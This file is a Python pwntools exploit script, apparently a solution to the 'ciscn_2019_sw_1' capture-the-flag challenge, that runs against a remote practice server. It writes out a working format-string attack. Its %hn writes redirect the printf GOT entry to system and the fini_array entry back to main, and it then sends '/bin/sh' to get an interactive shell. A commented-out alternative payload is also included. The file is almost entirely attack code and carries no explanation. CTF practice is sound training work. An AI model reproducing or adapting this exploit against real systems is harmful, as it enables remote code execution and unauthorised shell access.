from pwn import *
from LibcSearcher import *
context(os='linux',arch='i386',log_level='debug')
binary = './ciscn_2019_sw_1'
# io = process(binary)
io = remote('node4.buuoj.cn',26291)
elf = ELF(binary)

# gdb.attach(io, 'b printf')
def int2bytes(content):
	return bytes(str(content),encoding='utf-8')

printf_got = 0x0804989C #value 0xf7e4a680
system_plt = 0x080483D0

fini_array = 0x0804979C #value 0x80484d0
main_addr =  0x08048534
offset = 4
payload = p32(printf_got+2) + p32(printf_got) + p32(fini_array)
payload += b"%" + int2bytes(0x0804 - 0xc) + b"c%4$hn"
payload += b"%" + int2bytes(0x83D0 - 0x0804) + b"c%5$hn"
payload += b"%" + int2bytes(0x8534 - 0x83D0) + b"c%6$hn"

# payload = p32(fini_array + 2) + p32(printf_got+2) + p32(printf_got) + p32(fini_array)
# payload += b"%" + int2bytes(0x0804 - 0x10) + b"c%4$hn"
# payload += b"%5$hn"
# payload += b"%" + int2bytes(0x83D0 - 0x0804) + b"c%6$hn"
# payload += b"%" + int2bytes(0x8534 - 0x83D0) + b"c%7$hn"


io.sendlineafter(b'name', payload)
io.sendlineafter(b"name?\n",b'/bin/sh\x00')

io.interactive()